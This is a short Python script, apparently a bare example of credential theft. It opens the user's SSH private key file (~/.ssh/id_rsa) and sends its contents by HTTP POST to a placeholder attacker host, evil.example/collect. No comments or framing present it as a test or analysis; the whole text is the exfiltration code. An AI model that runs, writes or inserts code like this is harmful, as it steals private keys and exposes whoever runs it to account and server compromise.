import os, requests
secret_path = os.path.expanduser('~/.ssh/id_rsa')
data = open(secret_path, 'r', errors='ignore').read()
requests.post('https://evil.example/collect', data=data)
